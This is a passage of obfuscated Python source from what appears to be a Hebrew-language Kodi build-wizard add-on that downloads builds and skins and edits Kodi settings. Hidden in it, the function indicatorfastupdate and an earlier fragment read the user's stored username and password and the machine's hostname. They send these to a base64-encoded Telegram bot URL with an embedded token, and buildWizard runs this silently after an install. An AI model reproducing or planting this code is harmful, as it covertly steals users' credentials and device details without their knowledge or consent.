          OOO000O0OO0OOO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3389
          OO0OO000000O00OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3390
          OOOOOOO0O0OOO0OO0 =O0O0000OO0OOOO0O0 #line:3392
          O00O0OOO000O0O00O =OOO000OO0OOOOOO00 #line:3393
          import socket #line:3394
          OO0OO000000O00OOO =urllib2 .urlopen (OOO000O0OO0OOO0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOOOO0O0OOO0OO0 +' - '+O00O0OOO000O0O00O ).readlines ()#line:3395
       except :pass #line:3397
def indicatorfastupdate ():#line:3398
       try :#line:3399
          import json #line:3400
          wiz .log ('FRESH MESSAGE')#line:3401
          OO0000OOOOO00O0OO =(ADDON .getSetting ("user"))#line:3402
          O0000O0OOO0O0O000 =(ADDON .getSetting ("pass"))#line:3403
          O0OOO0OOOO0000OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3405
          OOOOOOOO0OO00O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3406
          O000OO0O00O0O00O0 =str (json .loads (OOOOOOOO0OO00O000 )['ip'])#line:3407
          OO00OOOO0OOO0O0O0 =OO0000OOOOO00O0OO #line:3408
          O0O0O0O0O00O000O0 =O0000O0OOO0O0O000 #line:3409
          import socket #line:3410
          OOOOOOOO0OO00O000 =urllib2 .urlopen (O0OOO0OOOO0000OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00OOOO0OOO0O0O0 +' - '+O0O0O0O0O00O000O0 ).readlines ()#line:3411
       except :pass #line:3413
def skinfix18 ():#line:3414
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3415
		OOOO0O0O0O0O00OO0 =wiz .workingURL (SKINID18DDONXML )#line:3416
		if OOOO0O0O0O0O00OO0 ==True :#line:3417
			OOO00O000O0O0OOO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3418
			if len (OOO00O000O0O0OOO0 )>0 :#line:3419
				OO0O00O00O0OOO0O0 ='%s-%s.zip'%(SKINID18 ,OOO00O000O0O0OOO0 [0 ])#line:3420
				O0OOO00O00OO00OOO =wiz .workingURL (SKIN18ZIPURL +OO0O00O00O0OOO0O0 )#line:3421
				if O0OOO00O00OO00OOO ==True :#line:3422
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3423
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3424
					O0O0O000OO0000OOO =os .path .join (PACKAGES ,OO0O00O00O0OOO0O0 )#line:3425
					try :os .remove (O0O0O000OO0000OOO )#line:3426
					except :pass #line:3427
					downloader .download (SKIN18ZIPURL +OO0O00O00O0OOO0O0 ,O0O0O000OO0000OOO ,DP )#line:3428
					extract .all (O0O0O000OO0000OOO ,HOME ,DP )#line:3429
					try :#line:3430
						O0OO0O0O00OOO00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3431
						O00OO00O0O0OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3432
						os .rename (O0OO0O0O00OOO00OO ,O00OO00O0O0OOOOO0 )#line:3433
					except :#line:3434
						pass #line:3435
					try :#line:3436
						O00O00OO0OOOOOO0O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOO0O0OOO0O0O0000 =O00O00OO0OOOOOO0O .read ();O00O00OO0OOOOOO0O .close ()#line:3437
						O00OOOO0O0O000000 =wiz .parseDOM (OOO0O0OOO0O0O0000 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3438
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOOO0O0O000000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3439
					except :#line:3440
						pass #line:3441
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3442
					DP .close ()#line:3443
					xbmc .sleep (500 )#line:3444
					wiz .forceUpdate (True )#line:3445
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3446
				else :#line:3447
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3448
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OOO00O00OO00OOO ,xbmc .LOGERROR )#line:3449
			else :#line:3450
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3451
		else :#line:3452
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3453
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3454
def skinfix17 ():#line:3455
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3456
		OOOOO0O00O0O0OO0O =wiz .workingURL (SKINID17DDONXML )#line:3457
		if OOOOO0O00O0O0OO0O ==True :#line:3458
			OO00OO000O00OO0OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3459
			if len (OO00OO000O00OO0OO )>0 :#line:3460
				O0O0000O000OO000O ='%s-%s.zip'%(SKINID17 ,OO00OO000O00OO0OO [0 ])#line:3461
				O00000O0000O00OOO =wiz .workingURL (SKIN17ZIPURL +O0O0000O000OO000O )#line:3462
				if O00000O0000O00OOO ==True :#line:3463
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3464
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3465
					O000OOOO00O0000OO =os .path .join (PACKAGES ,O0O0000O000OO000O )#line:3466
					try :os .remove (O000OOOO00O0000OO )#line:3467
					except :pass #line:3468
					downloader .download (SKIN17ZIPURL +O0O0000O000OO000O ,O000OOOO00O0000OO ,DP )#line:3469
					extract .all (O000OOOO00O0000OO ,HOME ,DP )#line:3470
					try :#line:3471
						OO0000OOOOOOOO00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3472
						O000O0OOOOO000000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3473
						os .rename (OO0000OOOOOOOO00O ,O000O0OOOOO000000 )#line:3474
					except :#line:3475
						pass #line:3476
					try :#line:3477
						OO0OO0O0O0OO0O000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0O0OOOO0O00O0O0 =OO0OO0O0O0OO0O000 .read ();OO0OO0O0O0OO0O000 .close ()#line:3478
						OOO0OOOO00O0OOO00 =wiz .parseDOM (OO0O0OOOO0O00O0O0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3479
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOOO00O0OOO00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3480
					except :#line:3481
						pass #line:3482
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3483
					DP .close ()#line:3484
					xbmc .sleep (500 )#line:3485
					wiz .forceUpdate (True )#line:3486
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3487
				else :#line:3488
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3489
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00000O0000O00OOO ,xbmc .LOGERROR )#line:3490
			else :#line:3491
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3492
		else :#line:3493
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3494
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3495
def fix17update ():#line:3496
	if KODIV >=17 and KODIV <18 :#line:3497
		wiz .kodi17Fix ()#line:3498
		xbmc .sleep (4000 )#line:3499
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3500
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3501
		fixfont ()#line:3502
		O00O000OO0O000O0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3503
		try :#line:3505
			OO0O000OOO000OOOO =open (O00O000OO0O000O0O ,'r')#line:3506
			O0O0OO00000O000O0 =OO0O000OOO000OOOO .read ()#line:3507
			OO0O000OOO000OOOO .close ()#line:3508
			O0OO0OO0OO0000O0O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3509
			OOO000OOOO0OOO0OO =re .compile (O0OO0OO0OO0000O0O ).findall (O0O0OO00000O000O0 )[0 ]#line:3510
			OO0O000OOO000OOOO =open (O00O000OO0O000O0O ,'w')#line:3511
			OO0O000OOO000OOOO .write (O0O0OO00000O000O0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO000OOOO0OOO0OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3512
			OO0O000OOO000OOOO .close ()#line:3513
		except :#line:3514
				pass #line:3515
		wiz .kodi17Fix ()#line:3516
		O00O000OO0O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3517
		try :#line:3518
			OO0O000OOO000OOOO =open (O00O000OO0O000O0O ,'r')#line:3519
			O0O0OO00000O000O0 =OO0O000OOO000OOOO .read ()#line:3520
			OO0O000OOO000OOOO .close ()#line:3521
			O0OO0OO0OO0000O0O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3522
			OOO000OOOO0OOO0OO =re .compile (O0OO0OO0OO0000O0O ).findall (O0O0OO00000O000O0 )[0 ]#line:3523
			OO0O000OOO000OOOO =open (O00O000OO0O000O0O ,'w')#line:3524
			OO0O000OOO000OOOO .write (O0O0OO00000O000O0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO000OOOO0OOO0OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3525
			OO0O000OOO000OOOO .close ()#line:3526
		except :#line:3527
				pass #line:3528
		swapSkins ('skin.Premium.mod')#line:3529
def fix18update ():#line:3531
	if KODIV >=18 :#line:3532
		xbmc .sleep (4000 )#line:3533
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3534
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3535
		fixfont ()#line:3536
		O0O0OOOO0O00OO000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3537
		try :#line:3538
			OO0OO00OOOOOOOOO0 =open (O0O0OOOO0O00OO000 ,'r')#line:3539
			O0O0OO00OO0O00000 =OO0OO00OOOOOOOOO0 .read ()#line:3540
			OO0OO00OOOOOOOOO0 .close ()#line:3541
			O0O0OOOOOOOO0OOO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3542
			O0OOO0O00O00O00O0 =re .compile (O0O0OOOOOOOO0OOO0 ).findall (O0O0OO00OO0O00000 )[0 ]#line:3543
			OO0OO00OOOOOOOOO0 =open (O0O0OOOO0O00OO000 ,'w')#line:3544
			OO0OO00OOOOOOOOO0 .write (O0O0OO00OO0O00000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOO0O00O00O00O0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3545
			OO0OO00OOOOOOOOO0 .close ()#line:3546
		except :#line:3547
				pass #line:3548
		wiz .kodi17Fix ()#line:3549
		O0O0OOOO0O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3550
		try :#line:3551
			OO0OO00OOOOOOOOO0 =open (O0O0OOOO0O00OO000 ,'r')#line:3552
			O0O0OO00OO0O00000 =OO0OO00OOOOOOOOO0 .read ()#line:3553
			OO0OO00OOOOOOOOO0 .close ()#line:3554
			O0O0OOOOOOOO0OOO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3555
			O0OOO0O00O00O00O0 =re .compile (O0O0OOOOOOOO0OOO0 ).findall (O0O0OO00OO0O00000 )[0 ]#line:3556
			OO0OO00OOOOOOOOO0 =open (O0O0OOOO0O00OO000 ,'w')#line:3557
			OO0OO00OOOOOOOOO0 .write (O0O0OO00OO0O00000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOO0O00O00O00O0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3558
			OO0OO00OOOOOOOOO0 .close ()#line:3559
		except :#line:3560
				pass #line:3561
		swapSkins ('skin.Premium.mod')#line:3562
def buildWizard (OO0000O00O0000O0O ,OOOOO0O0OOOO00O00 ,theme =None ,over =False ):#line:3565
	if over ==False :#line:3566
		OO0OOO00OOO0OO00O =wiz .checkBuild (OO0000O00O0000O0O ,'url')#line:3567
		if OO0OOO00OOO0OO00O ==False :#line:3569
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3573
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3574
			return #line:3575
		OOO00O00O000O0O00 =wiz .workingURL (OO0OOO00OOO0OO00O )#line:3576
		if OOO00O00O000O0O00 ==False :#line:3577
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OOO00O00O000O0O00 ))#line:3578
			return #line:3579
	if OOOOO0O0OOOO00O00 =='gui':#line:3580
		if OO0000O00O0000O0O ==BUILDNAME :#line:3581
			if over ==True :O0O0OO0O0O00O0OOO =1 #line:3582
			else :O0O0OO0O0O00O0OOO =1 #line:3583
		else :#line:3584
			O0O0OO0O0O00O0OOO =1 #line:3585
		if O0O0OO0O0O00O0OOO :#line:3586
			remove_addons ()#line:3587
			remove_addons2 ()#line:3588
			OOO0O0O0OO0O0O0OO =wiz .checkBuild (OO0000O00O0000O0O ,'gui')#line:3589
			OOO0O0O00000O00OO =OO0000O00O0000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3590
			if not wiz .workingURL (OOO0O0O0OO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3591
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3592
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O ),'','אנא המתן')#line:3593
			OOO000OOOOOOOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0O00000O00OO )#line:3594
			try :os .remove (OOO000OOOOOOOO0OO )#line:3595
			except :pass #line:3596
			logging .warning (OOO0O0O0OO0O0O0OO )#line:3597
			if 'google'in OOO0O0O0OO0O0O0OO :#line:3598
			   OOO0O0OO00OO0OOOO =googledrive_download (OOO0O0O0OO0O0O0OO ,OOO000OOOOOOOO0OO ,DP ,wiz .checkBuild (OO0000O00O0000O0O ,'filesize'))#line:3599
			else :#line:3602
			  downloader .download (OOO0O0O0OO0O0O0OO ,OOO000OOOOOOOO0OO ,DP )#line:3603
			xbmc .sleep (100 )#line:3604
			OOO000OOO000OO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O )#line:3605
			DP .update (0 ,OOO000OOO000OO0O0 ,'','אנא המתן')#line:3606
			extract .all (OOO000OOOOOOOO0OO ,HOME ,DP ,title =OOO000OOO000OO0O0 )#line:3607
			DP .close ()#line:3608
			wiz .defaultSkin ()#line:3609
			wiz .lookandFeelData ('save')#line:3610
			wiz .kodi17Fix ()#line:3611
			xbmc .executebuiltin ("ReloadSkin()")#line:3612
			if INSTALLMETHOD ==1 :OO000000O00O0OO0O =1 #line:3613
			elif INSTALLMETHOD ==2 :OO000000O00O0OO0O =0 #line:3614
			else :DP .close ()#line:3615
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3616
			indicatorfastupdate ()#line:3617
		else :#line:3619
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3620
	if OOOOO0O0OOOO00O00 =='gui2':#line:3621
		if OO0000O00O0000O0O ==BUILDNAME :#line:3622
			if over ==True :O0O0OO0O0O00O0OOO =1 #line:3623
			else :O0O0OO0O0O00O0OOO =1 #line:3624
		else :#line:3625
			O0O0OO0O0O00O0OOO =1 #line:3626
		if O0O0OO0O0O00O0OOO :#line:3627
			remove_addons ()#line:3628
			remove_addons2 ()#line:3629
			OOO0O0O0OO0O0O0OO =wiz .checkBuild (OO0000O00O0000O0O ,'gui')#line:3630
			OOO0O0O00000O00OO =OO0000O00O0000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3631
			if not wiz .workingURL (OOO0O0O0OO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3632
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3633
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O ),'','אנא המתן')#line:3634
			OOO000OOOOOOOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0O00000O00OO )#line:3635
			try :os .remove (OOO000OOOOOOOO0OO )#line:3636
			except :pass #line:3637
			logging .warning (OOO0O0O0OO0O0O0OO )#line:3638
			if 'google'in OOO0O0O0OO0O0O0OO :#line:3639
			   OOO0O0OO00OO0OOOO =googledrive_download (OOO0O0O0OO0O0O0OO ,OOO000OOOOOOOO0OO ,DP ,wiz .checkBuild (OO0000O00O0000O0O ,'filesize'))#line:3640
			else :#line:3643
			  downloader .download (OOO0O0O0OO0O0O0OO ,OOO000OOOOOOOO0OO ,DP )#line:3644
			xbmc .sleep (100 )#line:3645
			OOO000OOO000OO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O )#line:3646
			DP .update (0 ,OOO000OOO000OO0O0 ,'','אנא המתן')#line:3647
			extract .all (OOO000OOOOOOOO0OO ,HOME ,DP ,title =OOO000OOO000OO0O0 )#line:3648
			DP .close ()#line:3649
			wiz .defaultSkin ()#line:3650
			wiz .lookandFeelData ('save')#line:3651
			if INSTALLMETHOD ==1 :OO000000O00O0OO0O =1 #line:3654
			elif INSTALLMETHOD ==2 :OO000000O00O0OO0O =0 #line:3655
			else :DP .close ()#line:3656
		else :#line:3658
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3659
	elif OOOOO0O0OOOO00O00 =='fresh':#line:3660
		freshStart (OO0000O00O0000O0O )#line:3661
	elif OOOOO0O0OOOO00O00 =='normal':#line:3662
		if url =='normal':#line:3663
			if KEEPTRAKT =='true':#line:3664
				traktit .autoUpdate ('all')#line:3665
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3666
			if KEEPREAL =='true':#line:3667
				debridit .autoUpdate ('all')#line:3668
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3669
			if KEEPLOGIN =='true':#line:3670
				loginit .autoUpdate ('all')#line:3671
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3672
		O00O0OOO0OO0O00OO =int (KODIV );OOOO0O0OOOOOOO000 =int (float (wiz .checkBuild (OO0000O00O0000O0O ,'kodi')))#line:3673
		if not O00O0OOO0OO0O00OO ==OOOO0O0OOOOOOO000 :#line:3674
			if O00O0OOO0OO0O00OO ==16 and OOOO0O0OOOOOOO000 <=15 :O0OO0OOOOO0OOO0O0 =False #line:3675
			else :O0OO0OOOOO0OOO0O0 =True #line:3676
		else :O0OO0OOOOO0OOO0O0 =False #line:3677
		if O0OO0OOOOO0OOO0O0 ==True :#line:3678
			OO0O000O000000O00 =1 #line:3679
		else :#line:3680
			if not over ==False :OO0O000O000000O00 =1 #line:3681
			else :OO0O000O000000O00 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3682
		if OO0O000O000000O00 :#line:3683
			wiz .clearS ('build')#line:3684
			OOO0O0O0OO0O0O0OO =wiz .checkBuild (OO0000O00O0000O0O ,'url')#line:3685
			OOO0O0O00000O00OO =OO0000O00O0000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3686
			if not wiz .workingURL (OOO0O0O0OO0O0O0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3687
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3688
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O ,wiz .checkBuild (OO0000O00O0000O0O ,'version')),'','אנא המתן')#line:3689
			OOO000OOOOOOOO0OO =os .path .join (PACKAGES ,'%s.zip'%OOO0O0O00000O00OO )#line:3690
			try :os .remove (OOO000OOOOOOOO0OO )#line:3691
			except :pass #line:3692
			logging .warning (OOO0O0O0OO0O0O0OO )#line:3693
			if 'google'in OOO0O0O0OO0O0O0OO :#line:3694
			   OOO0O0OO00OO0OOOO =googledrive_download (OOO0O0O0OO0O0O0OO ,OOO000OOOOOOOO0OO ,DP ,wiz .checkBuild (OO0000O00O0000O0O ,'filesize'))#line:3695
			else :#line:3698
			  downloader .download (OOO0O0O0OO0O0O0OO ,OOO000OOOOOOOO0OO ,DP )#line:3699
			xbmc .sleep (1000 )#line:3700
			OOO000OOO000OO0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O ,wiz .checkBuild (OO0000O00O0000O0O ,'version'))#line:3701
			DP .update (0 ,OOO000OOO000OO0O0 ,'','Please Wait')#line:3702
			O0000O00OO0O0O000 ,O000OOO0000OOO00O ,O0O0000000OO0OOOO =extract .all (OOO000OOOOOOOO0OO ,HOME ,DP ,title =OOO000OOO000OO0O0 )#line:3703
			if int (float (O0000O00OO0O0O000 ))>0 :#line:3704
				wiz .fixmetas ()#line:3705
				wiz .lookandFeelData ('save')#line:3706
				wiz .defaultSkin ()#line:3707
				wiz .setS ('buildname',OO0000O00O0000O0O )#line:3709
				wiz .setS ('buildversion',wiz .checkBuild (OO0000O00O0000O0O ,'version'))#line:3710
				wiz .setS ('buildtheme','')#line:3711
				wiz .setS ('latestversion',wiz .checkBuild (OO0000O00O0000O0O ,'version'))#line:3712
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3713
				wiz .setS ('installed','true')#line:3714
				wiz .setS ('extract',str (O0000O00OO0O0O000 ))#line:3715
				wiz .setS ('errors',str (O000OOO0000OOO00O ))#line:3716
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0000O00OO0O0O000 ,O000OOO0000OOO00O ))#line:3717
				O00O0O000O000OO0O =(ADDON .getSetting ("gaiaseren"))#line:3719
				if O00O0O000O000OO0O =='true':#line:3720
					wiz .kodi17Fix ()#line:3721
				fastupdatefirstbuild (NOTEID )#line:3722
				skin_homeselect ()#line:3723
				skin_lower ()#line:3724
				rdbuildinstall ()#line:3725
				try :gaiaserenaddon ()#line:3727
				except :pass #line:3728
				adults18 ()#line:3729
				skinfix18 ()#line:3730
				try :os .remove (OOO000OOOOOOOO0OO )#line:3732
				except :pass #line:3733
				if O00O0O000O000OO0O =='true':#line:3735
					wiz .kodi17Fix ()#line:3736
				if int (float (O000OOO0000OOO00O ))>0 :#line:3738
					O0O0OO0O0O00O0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O00O0000O0O ,wiz .checkBuild (OO0000O00O0000O0O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0000O00OO0O0O000 ,'%',COLOR1 ,O000OOO0000OOO00O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3739
					if O0O0OO0O0O00O0OOO :#line:3740
						if isinstance (O000OOO0000OOO00O ,unicode ):#line:3741
							O0O0000000OO0OOOO =O0O0000000OO0OOOO .encode ('utf-8')#line:3742
						wiz .TextBox (ADDONTITLE ,O0O0000000OO0OOOO )#line:3743
				DP .close ()#line:3744
				OO00O00OO0000OO0O =wiz .themeCount (OO0000O00O0000O0O )#line:3745
				indicator ()#line:3746
				if not OO00O00OO0000OO0O ==False :#line:3747
					buildWizard (OO0000O00O0000O0O ,'theme')#line:3748
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3749
				if INSTALLMETHOD ==1 :OO000000O00O0OO0O =1 #line:3750
				elif INSTALLMETHOD ==2 :OO000000O00O0OO0O =0 #line:3751
				else :resetkodi ()#line:3752
				if OO000000O00O0OO0O ==1 :wiz .reloadFix ()#line:3754
				else :wiz .killxbmc (True )#line:3755
			else :#line:3756
				if isinstance (O000OOO0000OOO00O ,unicode ):#line:3757
					O0O0000000OO0OOOO =O0O0000000OO0OOOO .encode ('utf-8')#line:3758
				OO00O00000O0O0000 =open (OOO000OOOOOOOO0OO ,'r')#line:3759
				OO00OOOO000O0O0O0 =OO00O00000O0O0000 .read ()#line:3760
				O00OOOOO0000OOO00 =''#line:3761
				for O0OO0OOO0OO00O00O in OOO0O0OO00OO0OOOO :#line:3762
				  O00OOOOO0000OOO00 ='key: '+O00OOOOO0000OOO00 +'\n'+O0OO0OOO0OO00O00O #line:3763
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0000000OO0OOOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O00OOOOO0000OOO00 )#line:3764
		else :#line:3765
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3766
	elif OOOOO0O0OOOO00O00 =='theme':#line:3767
		if theme ==None :#line:3768
			OO00O00OO0000OO0O =wiz .checkBuild (OO0000O00O0000O0O ,'theme')#line:3769
			OOOOOO0O000OO0OOO =[]#line:3770
			if not OO00O00OO0000OO0O =='http://'and wiz .workingURL (OO00O00OO0000OO0O )==True :#line:3771
				OOOOOO0O000OO0OOO =wiz .themeCount (OO0000O00O0000O0O ,False )#line:3772
				if len (OOOOOO0O000OO0OOO )>0 :#line:3773
